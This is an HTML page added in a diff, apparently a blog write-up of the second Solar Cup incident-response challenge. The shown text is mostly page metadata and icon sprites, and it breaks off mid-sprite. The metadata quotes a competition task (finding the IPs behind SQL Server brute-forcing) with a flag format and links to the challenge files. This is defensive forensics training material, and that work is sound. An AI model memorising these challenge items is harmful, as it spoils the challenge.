@@ -1,0 +1,1894 @@
+<!DOCTYPE html>
+<html
+  lang="en"
+  class="color-toggle-hidden"
+  
+>
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="UTF-8" />
+<meta name="referrer" content="no-referrer" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta name="color-scheme" content="light dark" />
+<meta name="generator" content="Hugo 0.159.0">
+
+
+  <meta name="description" content=" 前言 日志排查 任务1 任务2 任务3 任务4 任务5 任务6 任务7 Solar内存取证 linux内存取证 确定linux内核 准备和内核完全匹配的Linux symbols(重点) 任务1 任务2 任务3 任务4 任务5 仿真DMZ环境应急响应 任务1 任务2 任务3 任务4 任务5 任务6 任务7 任务8 任务9 任务10 任务11 任务12 任务13 任务14 任务15 任务16 任务17 应急溯源 任务1 任务2 任务3 任务4 任务5 任务6 任务7 任务8 前言 solar赛复现，不过没复现reverse 而且有些题在qsnctf靶场没找到 所以就剩这四道题了
+日志排查 时间：2025年12月17日 事件：安全运营中心（SOC）监测到数据库服务器流量异常，随后发现管理员组中出现不明账号。任务：请根据提供的日志文件（MSSQL ERRORLOG、Windows 安全日志、系统镜像/注册表），按时间顺序回答以下问题 备份下载1：https://pan.baidu.com/s/1d8M7slE_2PXr3fLD2VzayQ 提取码: hjfa 备份下载2：https://wwboa.lanzouq.com/ijPsg3egom3i 备份下载3：链接：https://pan.quark.cn/s/a7a9dfbdfaa2 提取码：3xeW 请勿导入注册表！！ 任务1 任务名称：任务1 任务分数：2.00 任务类型：静态Flag 在攻击真正发生之前，防火墙记录到了针对 SQL Server 的暴力破解行为。请找出发起暴力破解（大量登录失败）的 IP 地址。（按时间顺序用_连接，FLAG格式为：flag{ip_ip} " />
+
+    <title>第二届solar杯·应急响应挑战赛 | Sly Aaron Notes</title>
+
+    <link rel="icon" type="image/svg+xml" href="/favicon/favicon.svg" />
+<link
+  rel="icon"
+  type="image/png"
+  sizes="32x32"
+  href="/favicon/favicon-32x32.png"
+/>
+<link
+  rel="icon"
+  type="image/png"
+  sizes="16x16"
+  href="/favicon/favicon-16x16.png"
+/>
+
+    
+
+    
+  <meta
+    property="og:title"
+    content="第二届solar杯·应急响应挑战赛"
+  />
+  <meta property="og:site_name" content="Sly Aaron Notes" />
+  <meta property="og:description" content=" 前言 日志排查 任务1 任务2 任务3 任务4 任务5 任务6 任务7 Solar内存取证 linux内存取证 确定linux内核 准备和内核完全匹配的Linux symbols(重点) 任务1 任务2 任务3 任务4 任务5 仿真DMZ环境应急响应 任务1 任务2 任务3 任务4 任务5 任务6 任务7 任务8 任务9 任务10 任务11 任务12 任务13 任务14 任务15 任务16 任务17 应急溯源 任务1 任务2 任务3 任务4 任务5 任务6 任务7 任务8 前言 solar赛复现，不过没复现reverse 而且有些题在qsnctf靶场没找到 所以就剩这四道题了
+日志排查 时间：2025年12月17日 事件：安全运营中心（SOC）监测到数据库服务器流量异常，随后发现管理员组中出现不明账号。任务：请根据提供的日志文件（MSSQL ERRORLOG、Windows 安全日志、系统镜像/注册表），按时间顺序回答以下问题 备份下载1：https://pan.baidu.com/s/1d8M7slE_2PXr3fLD2VzayQ 提取码: hjfa 备份下载2：https://wwboa.lanzouq.com/ijPsg3egom3i 备份下载3：链接：https://pan.quark.cn/s/a7a9dfbdfaa2 提取码：3xeW 请勿导入注册表！！ 任务1 任务名称：任务1 任务分数：2.00 任务类型：静态Flag 在攻击真正发生之前，防火墙记录到了针对 SQL Server 的暴力破解行为。请找出发起暴力破解（大量登录失败）的 IP 地址。（按时间顺序用_连接，FLAG格式为：flag{ip_ip} " />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/incident-response/solar2/" />
+
+<meta property="article:section" content="Incident Response" />
+    <meta
+      property="article:published_time"
+      content="2026-03-27T00:00:00+00:00"
+    />
+    <meta
+      property="article:modified_time"
+      content="2026-03-27T00:00:00+00:00"
+    />
+
+
+  <meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="第二届solar杯·应急响应挑战赛" />
+  <meta name="twitter:description" content=" 前言 日志排查 任务1 任务2 任务3 任务4 任务5 任务6 任务7 Solar内存取证 linux内存取证 确定linux内核 准备和内核完全匹配的Linux symbols(重点) 任务1 任务2 任务3 任务4 任务5 仿真DMZ环境应急响应 任务1 任务2 任务3 任务4 任务5 任务6 任务7 任务8 任务9 任务10 任务11 任务12 任务13 任务14 任务15 任务16 任务17 应急溯源 任务1 任务2 任务3 任务4 任务5 任务6 任务7 任务8 前言 solar赛复现，不过没复现reverse 而且有些题在qsnctf靶场没找到 所以就剩这四道题了
+日志排查 时间：2025年12月17日 事件：安全运营中心（SOC）监测到数据库服务器流量异常，随后发现管理员组中出现不明账号。任务：请根据提供的日志文件（MSSQL ERRORLOG、Windows 安全日志、系统镜像/注册表），按时间顺序回答以下问题 备份下载1：https://pan.baidu.com/s/1d8M7slE_2PXr3fLD2VzayQ 提取码: hjfa 备份下载2：https://wwboa.lanzouq.com/ijPsg3egom3i 备份下载3：链接：https://pan.quark.cn/s/a7a9dfbdfaa2 提取码：3xeW 请勿导入注册表！！ 任务1 任务名称：任务1 任务分数：2.00 任务类型：静态Flag 在攻击真正发生之前，防火墙记录到了针对 SQL Server 的暴力破解行为。请找出发起暴力破解（大量登录失败）的 IP 地址。（按时间顺序用_连接，FLAG格式为：flag{ip_ip} " />
+
+
+  <script type="application/ld+json">
+  {
+      "@context": "http://schema.org",
+      "@type": "TechArticle",
+      "articleSection": "Incident Response",
+      "name": "第二届solar杯·应急响应挑战赛",
+      "url" : "http://localhost:1313/incident-response/solar2/",
+      "headline": "第二届solar杯·应急响应挑战赛",
+      "description": " 前言 日志排查 任务1 任务2 任务3 任务4 任务5 任务6 任务7 Solar内存取证 linux内存取证 确定linux内核 准备和内核完全匹配的Linux symbols(重点) 任务1 任务2 任务3 任务4 任务5 仿真DMZ环境应急响应 任务1 任务2 任务3 任务4 任务5 任务6 任务7 任务8 任务9 任务10 任务11 任务12 任务13 任务14 任务15 任务16 任务17 应急溯源 任务1 任务2 任务3 任务4 任务5 任务6 任务7 任务8 前言 solar赛复现，不过没复现reverse 而且有些题在qsnctf靶场没找到 所以就剩这四道题了\n日志排查 时间：2025年12月17日 事件：安全运营中心（SOC）监测到数据库服务器流量异常，随后发现管理员组中出现不明账号。任务：请根据提供的日志文件（MSSQL ERRORLOG、Windows 安全日志、系统镜像\/注册表），按时间顺序回答以下问题 备份下载1：https:\/\/pan.baidu.com\/s\/1d8M7slE_2PXr3fLD2VzayQ 提取码: hjfa 备份下载2：https:\/\/wwboa.lanzouq.com\/ijPsg3egom3i 备份下载3：链接：https:\/\/pan.quark.cn\/s\/a7a9dfbdfaa2 提取码：3xeW 请勿导入注册表！！ 任务1 任务名称：任务1 任务分数：2.00 任务类型：静态Flag 在攻击真正发生之前，防火墙记录到了针对 SQL Server 的暴力破解行为。请找出发起暴力破解（大量登录失败）的 IP 地址。（按时间顺序用_连接，FLAG格式为：flag{ip_ip} ",""
+      "wordCount" : "795",
+      "inLanguage": "en",
+      "isFamilyFriendly": "true",
+      "mainEntityOfPage": {
+          "@type": "WebPage",
+          "@id": "http://localhost:1313/incident-response/solar2/"
+      },
+      "keywords" : [ "incident-response" ],
+      "copyrightHolder" : "Sly Aaron Notes",
+      "copyrightYear" : "2026",
+      "dateCreated": "2026-03-27T00:00:00.00Z",
+      "datePublished": "2026-03-27T00:00:00.00Z",
+      "dateModified": "2026-03-27T00:00:00.00Z",
+      "publisher":{
+          "@type":"Organization",
+          "name": "Sly Aaron Notes",
+          "url": "http://localhost:1313/",
+          "logo": {
+              "@type": "ImageObject",
+              "url": "http://localhost:1313/brand.svg",
+              "width":"32",
+              "height":"32"
+          }
+      }
+  }
+  </script>
+
+
+    
+  <script src="/js/colortheme-9a38f5f8.bundle.min.js"></script>
+<script src="/js/main-9ea6fcb1.bundle.min.js"></script>
+
+<link
+  rel="preload"
+  as="font"
+  href="/fonts/Metropolis.woff2"
+  type="font/woff2"
+  crossorigin="anonymous"
+/>
+<link
+  rel="preload"
+  as="font"
+  href="/fonts/LiberationSans.woff2"
+  type="font/woff2"
+  crossorigin="anonymous"
+/>
+
+<link
+  rel="preload"
+  href="/main-188aff9e.min.css"
+  as="style"
+/>
+<link
+  rel="stylesheet"
+  href="/main-188aff9e.min.css"
+  media="all"
+/>
+
+<link
+  rel="preload"
+  href="/mobile-7885c8a8.min.css"
+  as="style"
+/>
+<link
+  rel="stylesheet"
+  href="/mobile-7885c8a8.min.css"
+  media="screen and (max-width: 45rem)"
+/>
+
+<link
+  rel="preload"
+  href="/print-72068949.min.css"
+  as="style"
+/>
+<link
+  rel="stylesheet"
+  href="/print-72068949.min.css"
+  media="print"
+/>
+
+<link
+  rel="preload"
+  href="/custom.css"
+  as="style"
+/>
+<link
+  rel="stylesheet"
+  href="/custom.css"
+  media="all"
+/>
+  <link href="http://localhost:1313/incident-response/solar2/" rel="canonical" type="text/html" />
+
+<!-- Made with Geekdoc theme https://github.com/thegeeklab/hugo-geekdoc -->
+
+    
+
+  </head>
+
+  <body itemscope itemtype="https://schema.org/WebPage">
+    <div class="w-full flex justify-center">
+      <a href="#main-content" id="gdoc-to-main" class="gdoc-markdown__link">Skip to main content</a>
+    </div>
+
+    
+  <!-- geekdoc include: /sprites/geekdoc.svg -->
+  <svg class="svg-sprite" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><svg viewBox="-7.27 -7.27 38.55 38.55" id="gdoc_arrow_back" xmlns="http://www.w3.org/2000/svg"><path d="M24 10.526v2.947H5.755l8.351 8.421-2.105 2.105-12-12 12-12 2.105 2.105-8.351 8.421H24z"/></svg><svg viewBox="-7.27 -7.27 38.55 38.55" id="gdoc_arrow_left_alt" xmlns="http://www.w3.org/2000/svg"><path d="M5.965 10.526V6.035L0 12l5.965 5.965v-4.491H24v-2.947H5.965z"/></svg><svg viewBox="-7.27 -7.27 38.55 38.55" id="gdoc_arrow_right_alt" xmlns="http://www.w3.org/2000/svg"><path d="M18.035 10.526V6.035L24 12l-5.965 5.965v-4.491H0v-2.947h18.035z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_bitbucket" xmlns="http://www.w3.org/2000/svg"><path d="M15.905 13.355c.189 1.444-1.564 2.578-2.784 1.839-1.375-.602-1.375-2.784-.034-3.403 1.151-.705 2.818.223 2.818 1.564zm1.907-.361c-.309-2.44-3.076-4.056-5.328-3.042-1.426.636-2.389 2.148-2.32 3.747.086 2.097 2.08 3.815 4.176 3.626s3.729-2.234 3.472-4.331zm4.108-9.315c-.756-.997-2.045-1.169-3.179-1.358-3.214-.516-6.513-.533-9.727.034-1.066.172-2.269.361-2.939 1.323 1.1 1.031 2.664 1.186 4.073 1.358 2.544.327 5.156.344 7.699.017 1.426-.172 3.008-.309 4.073-1.375zm.979 17.788c-.481 1.684-.206 3.953-1.994 4.932-3.076 1.701-6.806 1.89-10.191 1.289-1.787-.327-3.884-.894-4.864-2.578-.43-1.65-.705-3.334-.98-5.018l.103-.275.309-.155c5.121 3.386 12.288 3.386 17.427 0 .808.241.206 1.22.189 1.805zM26.01 4.951c-.584 3.764-1.255 7.51-1.908 11.257-.189 1.1-1.255 1.719-2.148 2.183-3.214 1.615-6.96 1.89-10.483 1.512-2.389-.258-4.829-.894-6.771-2.389-.911-.705-.911-1.908-1.083-2.922-.602-3.523-1.289-7.046-1.719-10.604.206-1.547 1.942-2.217 3.231-2.698C6.848.654 8.686.362 10.508.19c3.884-.378 7.854-.241 11.618.859 1.341.395 2.784.945 3.695 2.097.412.533.275 1.203.189 1.805z"/></svg><svg viewBox="-7.27 -7.27 38.55 38.55" id="gdoc_bookmark" xmlns="http://www.w3.org/2000/svg"><path d="M15.268 4.392q.868 0 1.532.638t.664 1.506v17.463l-7.659-3.268-7.608 3.268V6.536q0-.868.664-1.506t1.532-.638h10.876zm4.34 14.144V4.392q0-.868-.638-1.532t-1.506-.664H6.537q0-.868.664-1.532T8.733 0h10.876q.868 0 1.532.664t.664 1.532v17.412z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_brightness_auto" xmlns="http://www.w3.org/2000/svg"><path d="M16.846 18.938h2.382L15.22 7.785h-2.44L8.772 18.938h2.382l.871-2.44h3.95zm7.087-9.062L27.999 14l-4.066 4.124v5.809h-5.809L14 27.999l-4.124-4.066H4.067v-5.809L.001 14l4.066-4.124V4.067h5.809L14 .001l4.124 4.066h5.809v5.809zm-11.385 4.937L14 10.282l1.452 4.531h-2.904z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_brightness_dark" xmlns="http://www.w3.org/2000/svg"><path d="M14 21.435q3.079 0 5.257-2.178T21.435 14t-2.178-5.257T14 6.565q-1.51 0-3.079.697 1.917.871 3.108 2.701T15.22 14t-1.191 4.037-3.108 2.701q1.568.697 3.079.697zm9.933-11.559L27.999 14l-4.066 4.124v5.809h-5.809L14 27.999l-4.124-4.066H4.067v-5.809L.001 14l4.066-4.124V4.067h5.809L14 .001l4.124 4.066h5.809v5.809z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_brightness_light" xmlns="http://www.w3.org/2000/svg"><path d="M14 21.435q3.079 0 5.257-2.178T21.435 14t-2.178-5.257T14 6.565 8.743 8.743 6.565 14t2.178 5.257T14 21.435zm9.933-3.311v5.809h-5.809L14 27.999l-4.124-4.066H4.067v-5.809L.001 14l4.066-4.124V4.067h5.809L14 .001l4.124 4.066h5.809v5.809L27.999 14z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_check" xmlns="http://www.w3.org/2000/svg"><path d="M8.885 20.197 25.759 3.323l2.24 2.24L8.885 24.677 0 15.792l2.24-2.24z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_check_circle_outline" xmlns="http://www.w3.org/2000/svg"><path d="M14 25.239q4.601 0 7.92-3.319T25.239 14 21.92 6.08 14 2.761 6.08 6.08 2.761 14t3.319 7.92T14 25.239zM14 0q5.784 0 9.892 4.108T28 14t-4.108 9.892T14 28t-9.892-4.108T0 14t4.108-9.892T14 0zm6.441 7.822 1.972 1.972-11.239 11.239L4.207 14l1.972-1.972 4.995 4.995z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_cloud_off" xmlns="http://www.w3.org/2000/svg"><path d="M9.023 10.5H7q-1.914 0-3.281 1.395t-1.367 3.309 1.367 3.281T7 19.852h11.375zM3.5 4.976l1.477-1.477L24.5 23.022l-1.477 1.477-2.352-2.297H6.999q-2.898 0-4.949-2.051t-2.051-4.949q0-2.844 1.969-4.867t4.758-2.133zm19.086 5.578q2.242.164 3.828 1.832T28 16.351q0 3.008-2.461 4.758l-1.695-1.695q1.805-.984 1.805-3.063 0-1.422-1.039-2.461t-2.461-1.039h-1.75v-.602q0-2.68-1.859-4.539t-4.539-1.859q-1.531 0-2.953.711l-1.75-1.695Q11.431 3.5 14.001 3.5q2.953 0 5.496 2.078t3.09 4.977z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_code" xmlns="http://www.w3.org/2000/svg"><path d="M9.917 24.5a1.75 1.75 0 1 0-3.501.001 1.75 1.75 0 0 0 3.501-.001zm0-21a1.75 1.75 0 1 0-3.501.001A1.75 1.75 0 0 0 9.917 3.5zm11.666 2.333a1.75 1.75 0 1 0-3.501.001 1.75 1.75 0 0 0 3.501-.001zm1.75 0a3.502 3.502 0 0 1-1.75 3.026c-.055 6.581-4.721 8.039-7.82 9.023-2.898.911-3.846 1.349-3.846 3.117v.474a3.502 3.502 0 0 1 1.75 3.026c0 1.932-1.568 3.5-3.5 3.5s-3.5-1.568-3.5-3.5c0-1.294.711-2.424 1.75-3.026V6.526A3.502 3.502 0 0 1 4.667 3.5c0-1.932 1.568-3.5 3.5-3.5s3.5 1.568 3.5 3.5a3.502 3.502 0 0 1-1.75 3.026v9.06c.93-.456 1.914-.766 2.807-1.039 3.391-1.075 5.323-1.878 5.359-5.687a3.502 3.502 0 0 1-1.75-3.026c0-1.932 1.568-3.5 3.5-3.5s3.5 1.568 3.5 3.5z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_copy" xmlns="http://www.w3.org/2000/svg"><path d="M23.502 25.438V7.626H9.562v17.812h13.94zm0-20.315q1.013 0 1.787.745t.774 1.757v17.812q0 1.013-.774 1.787t-1.787.774H9.562q-1.013 0-1.787-.774t-.774-1.787V7.625q0-1.013.774-1.757t1.787-.745h13.94zM19.689 0v2.562H4.438v17.812H1.936V2.562q0-1.013.745-1.787T4.438.001h15.251z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_dangerous" xmlns="http://www.w3.org/2000/svg"><path d="M21.802 19.833 15.969 14l5.833-5.833-1.969-1.969L14 12.031 8.167 6.198 6.198 8.167 12.031 14l-5.833 5.833 1.969 1.969L14 15.969l5.833 5.833zM19.833 0 28 8.167v11.666L19.833 28H8.167L0 19.833V8.167L8.167 0h11.666z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gdoc_date" xmlns="http://www.w3.org/2000/svg"><path d="M27.192 28.844V11.192H4.808v17.652h22.384zm0-25.689q1.277 0 2.253.976t.976 2.253v22.459q0 1.277-.976 2.216t-2.253.939H4.808q-1.352 0-2.291-.901t-.939-2.253V6.385q0-1.277.939-2.253t2.291-.976h1.577V.001h3.23v3.155h12.769V.001h3.23v3.155h1.577zm-3.155 11.267v3.155h-3.23v-3.155h3.23zm-6.46 0v3.155h-3.155v-3.155h3.155zm-6.384 0v3.155h-3.23v-3.155h3.23z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gdoc_download" xmlns="http://www.w3.org/2000/svg"><path d="M2.866 28.209h26.269v3.79H2.866v-3.79zm26.268-16.925L16 24.418 2.866 11.284h7.493V.001h11.283v11.283h7.493z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gdoc_email" xmlns="http://www.w3.org/2000/svg"><path d="M28.845 9.615v-3.23L16 14.422 3.155 6.385v3.23L16 17.577zm0-6.46q1.277 0 2.216.977T32 6.385v19.23q0 1.277-.939 2.253t-2.216.977H3.155q-1.277 0-2.216-.977T0 25.615V6.385q0-1.277.939-2.253t2.216-.977h25.69z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_error_outline" xmlns="http://www.w3.org/2000/svg"><path d="M14 25.239q4.601 0 7.92-3.319T25.239 14 21.92 6.08 14 2.761 6.08 6.08 2.761 14t3.319 7.92T14 25.239zM14 0q5.784 0 9.892 4.108T28 14t-4.108 9.892T14 28t-9.892-4.108T0 14t4.108-9.892T14 0zm-1.38 6.967h2.761v8.413H12.62V6.967zm0 11.239h2.761v2.826H12.62v-2.826z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_fire" xmlns="http://www.w3.org/2000/svg"><path d="M17.689 21.998q-.32.32-.8.576t-.864.384q-1.152.384-2.272.032t-1.888-.992q-.128-.128-.096-.256t.16-.192q1.216-.384 1.92-1.216t.96-1.792q.192-.896-.064-1.728t-.384-1.728q-.128-.704-.096-1.376t.288-1.312q0-.128.128-.128t.192.064q.384.832.992 1.472t1.28 1.216 1.216 1.248.672 1.568q.064.384.064.704.064.96-.32 1.92t-1.088 1.536zm3.84-10.944q-.768-.704-1.6-1.28t-1.6-1.344q-1.536-1.536-2.016-3.584t.16-4.16q.128-.32-.096-.544t-.544-.096q-.768.32-1.44.768t-1.312.896q-1.984 1.664-3.136 3.936T8.633 10.51t.8 5.088q0 .128.032.256t.032.256q0 .576-.512.832t-1.024-.192q-.128-.192-.192-.32-1.024-1.28-1.376-2.912t-.096-3.232q.064-.384-.288-.576t-.608.128q-1.28 1.664-1.856 3.68t-.448 4.064q0 .576.096 1.184t.288 1.184q.448 1.536 1.216 2.816 1.216 2.048 3.264 3.424t4.416 1.696q2.496.32 5.024-.256t4.448-2.304q1.408-1.344 2.208-3.104t.864-3.68-.704-3.712q-.064-.128-.096-.224t-.096-.224q-.576-1.088-1.28-1.984-.256-.384-.544-.704t-.672-.64z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_git" xmlns="http://www.w3.org/2000/svg"><path d="M27.472 12.753 15.247.529a1.803 1.803 0 0 0-2.55 0l-2.84 2.84 2.137 2.137a2.625 2.625 0 0 1 3.501 3.501l3.499 3.499a2.625 2.625 0 1 1-1.237 1.237l-3.499-3.499c-.083.04-.169.075-.257.106v7.3a2.626 2.626 0 1 1-1.75 0v-7.3a2.626 2.626 0 0 1-1.494-3.607L8.62 4.606l-8.09 8.09a1.805 1.805 0 0 0 0 2.551l12.225 12.224a1.803 1.803 0 0 0 2.55 0l12.168-12.168a1.805 1.805 0 0 0 0-2.551z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gdoc_gitea" xmlns="http://www.w3.org/2000/svg"><path d="M5.581 7.229c-2.46-.005-5.755 1.559-5.573 5.48.284 6.125 6.56 6.693 9.068 6.743.275 1.149 3.227 5.112 5.412 5.32h9.573c5.741-.381 10.04-17.363 6.853-17.427-5.271.248-8.395.373-11.073.395v5.3l-.835-.369-.005-4.928c-3.075-.001-5.781-.144-10.919-.397-.643-.004-1.539-.113-2.501-.116zm.348 2.166h.293c.349 3.14.917 4.976 2.067 7.781-2.933-.347-5.429-1.199-5.888-4.38-.237-1.647.563-3.365 3.528-3.401zm11.409 3.087c.2.003.404.04.596.128l.999.431-.716 1.305h-.007a.996.996 0 0 0-.321.053l.006-.002c-.349.114-.593.406-.593.749 0 .097.019.189.055.275l-.002-.006a.767.767 0 0 0 .151.233l-.001-.001-1.235 2.248a.99.99 0 0 0-.302.052l.006-.002c-.349.114-.593.406-.593.749 0 .097.019.189.055.275l-.002-.006c.128.31.457.527.843.527a.987.987 0 0 0 .31-.049l-.006.002c.348-.114.592-.406.592-.749 0-.097-.02-.19-.056-.277l.002.006a.784.784 0 0 0-.211-.293l1.203-2.189a.999.999 0 0 0 .397-.041l-.006.002a.942.942 0 0 0 .285-.15l-.001.001c.464.195.844.353 1.117.488.411.203.556.337.6.487.044.147-.004.429-.236.925-.173.369-.46.893-.799 1.511h-.02a.991.991 0 0 0-.321.053l.006-.002c-.349.114-.593.406-.593.749 0 .097.019.189.055.275l-.002-.006c.128.31.457.527.843.527a.987.987 0 0 0 .31-.049l-.006.002c.348-.114.592-.406.592-.749a.703.703 0 0 0-.055-.275l.002.006a.802.802 0 0 0-.183-.27l.001.001c.335-.611.623-1.136.808-1.531.251-.536.381-.935.267-1.32s-.467-.636-.933-.867c-.307-.151-.689-.311-1.147-.503a.723.723 0 0 0-.052-.324l.002.006a.792.792 0 0 0-.194-.279l.704-1.284 3.899 1.684c.704.305.995 1.053.653 1.68l-2.68 4.907c-.343.625-1.184.884-1.888.58l-5.516-2.384c-.704-.304-.996-1.053-.653-1.68l2.68-4.905c.235-.431.707-.687 1.207-.707z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gdoc_github" xmlns="http://www.w3.org/2000/svg"><path d="M16 .394c8.833 0 15.999 7.166 15.999 15.999 0 7.062-4.583 13.062-10.937 15.187-.813.146-1.104-.354-1.104-.771 0-.521.021-2.25.021-4.396 0-1.5-.5-2.458-1.083-2.958 3.562-.396 7.312-1.75 7.312-7.896 0-1.75-.625-3.167-1.646-4.291.167-.417.708-2.042-.167-4.25-1.333-.417-4.396 1.646-4.396 1.646a15.032 15.032 0 0 0-8 0S8.937 6.602 7.603 7.018c-.875 2.208-.333 3.833-.167 4.25-1.021 1.125-1.646 2.542-1.646 4.291 0 6.125 3.729 7.5 7.291 7.896-.458.417-.875 1.125-1.021 2.146-.917.417-3.25 1.125-4.646-1.333-.875-1.521-2.458-1.646-2.458-1.646-1.562-.021-.104.979-.104.979 1.042.479 1.771 2.333 1.771 2.333.938 2.854 5.396 1.896 5.396 1.896 0 1.333.021 2.583.021 2.979 0 .417-.292.917-1.104.771C4.582 29.455-.001 23.455-.001 16.393-.001 7.56 7.165.394 15.998.394zM6.063 23.372c.042-.083-.021-.187-.146-.25-.125-.042-.229-.021-.271.042-.042.083.021.187.146.25.104.062.229.042.271-.042zm.646.709c.083-.062.062-.208-.042-.333-.104-.104-.25-.146-.333-.062-.083.062-.062.208.042.333.104.104.25.146.333.062zm.625.937c.104-.083.104-.25 0-.396-.083-.146-.25-.208-.354-.125-.104.062-.104.229 0 .375s.271.208.354.146zm.875.875c.083-.083.042-.271-.083-.396-.146-.146-.333-.167-.417-.062-.104.083-.062.271.083.396.146.146.333.167.417.062zm1.187.521c.042-.125-.083-.271-.271-.333-.167-.042-.354.021-.396.146s.083.271.271.312c.167.062.354 0 .396-.125zm1.313.104c0-.146-.167-.25-.354-.229-.187 0-.333.104-.333.229 0 .146.146.25.354.229.187 0 .333-.104.333-.229zm1.208-.208c-.021-.125-.187-.208-.375-.187-.187.042-.312.167-.292.312.021.125.187.208.375.167s.312-.167.292-.292z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_gitlab" xmlns="http://www.w3.org/2000/svg"><path d="M1.629 11.034 14 26.888.442 17.048a1.09 1.09 0 0 1-.39-1.203l1.578-4.811zm7.217 0h10.309l-5.154 15.854zM5.753 1.475l3.093 9.559H1.63l3.093-9.559a.548.548 0 0 1 1.031 0zm20.618 9.559 1.578 4.811c.141.437-.016.922-.39 1.203l-13.558 9.84 12.371-15.854zm0 0h-7.216l3.093-9.559a.548.548 0 0 1 1.031 0z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gdoc_heart" xmlns="http://www.w3.org/2000/svg"><path d="M16 29.714a1.11 1.11 0 0 1-.786-.321L4.072 18.643c-.143-.125-4.071-3.714-4.071-8 0-5.232 3.196-8.357 8.535-8.357 3.125 0 6.053 2.464 7.464 3.857 1.411-1.393 4.339-3.857 7.464-3.857 5.339 0 8.535 3.125 8.535 8.357 0 4.286-3.928 7.875-4.089 8.035L16.785 29.392c-.214.214-.5.321-.786.321z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_home" xmlns="http://www.w3.org/2000/svg"><path d="M24.003 15.695v8.336c0 .608-.504 1.111-1.111 1.111h-6.669v-6.669h-4.446v6.669H5.108a1.119 1.119 0 0 1-1.111-1.111v-8.336c0-.035.017-.069.017-.104L14 7.359l9.986 8.232a.224.224 0 0 1 .017.104zm3.873-1.198-1.077 1.285a.578.578 0 0 1-.365.191h-.052a.547.547 0 0 1-.365-.122L14 5.831 1.983 15.851a.594.594 0 0 1-.417.122.578.578 0 0 1-.365-.191L.124 14.497a.57.57 0 0 1 .069-.781L12.679 3.314c.729-.608 1.91-.608 2.64 0l4.237 3.543V3.471c0-.313.243-.556.556-.556h3.334c.313 0 .556.243.556.556v7.085l3.803 3.161c.226.191.26.556.069.781z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_info_outline" xmlns="http://www.w3.org/2000/svg"><path d="M12.62 9.793V6.967h2.761v2.826H12.62zM14 25.239q4.601 0 7.92-3.319T25.239 14 21.92 6.08 14 2.761 6.08 6.08 2.761 14t3.319 7.92T14 25.239zM14 0q5.784 0 9.892 4.108T28 14t-4.108 9.892T14 28t-9.892-4.108T0 14t4.108-9.892T14 0zm-1.38 21.033V12.62h2.761v8.413H12.62z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_keyboard_arrow_down" xmlns="http://www.w3.org/2000/svg"><path d="M3.281 5.36 14 16.079 24.719 5.36 28 8.641l-14 14-14-14z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gdoc_keyboard_arrow_left" xmlns="http://www.w3.org/2000/svg"><path d="M25.875 28.25 22.125 32 6.126 16.001 22.125.002l3.75 3.75-12.25 12.25z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gdoc_keyboard_arrow_right" xmlns="http://www.w3.org/2000/svg"><path d="M6.125 28.25 18.375 16 6.125 3.75 9.875 0l15.999 15.999L9.875 31.998z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_keyboard_arrow_up" xmlns="http://www.w3.org/2000/svg"><path d="M24.719 22.64 14 11.921 3.281 22.64 0 19.359l14-14 14 14z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gdoc_language" xmlns="http://www.w3.org/2000/svg"><path d="M20.112 16.826h4.732q.394-1.84.394-2.826t-.394-2.826h-4.732q.197 1.38.197 2.826t-.197 2.826zm-2.497 7.756q1.643-.526 3.418-2.005t2.695-2.991h-4.141q-.657 2.629-1.972 4.995zm-.329-7.756q.197-1.38.197-2.826t-.197-2.826h-6.573q-.197 1.38-.197 2.826t.197 2.826h6.573zM14 25.173q1.84-2.695 2.695-5.587h-5.39q.854 2.892 2.695 5.587zM8.413 8.413q.789-2.826 1.972-4.995-1.643.526-3.451 2.005T4.272 8.414h4.141zM4.272 19.587q.854 1.512 2.662 2.991t3.451 2.005q-1.315-2.366-1.972-4.995H4.272zm-1.117-2.761h4.732Q7.69 15.446 7.69 14t.197-2.826H3.155q-.394 1.84-.394 2.826t.394 2.826zM14 2.826q-1.84 2.695-2.695 5.587h5.39Q15.841 5.521 14 2.826zm9.727 5.587q-.92-1.512-2.695-2.991t-3.418-2.005q1.183 2.169 1.972 4.995h4.141zM14 0q5.784 0 9.892 4.108T28 14t-4.108 9.892T14 28t-9.892-4.108T0 14t4.108-9.892T14 0z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gdoc_link" xmlns="http://www.w3.org/2000/svg"><path d="M24.037 7.963q3.305 0 5.634 2.366T32 16t-2.329 5.671-5.634 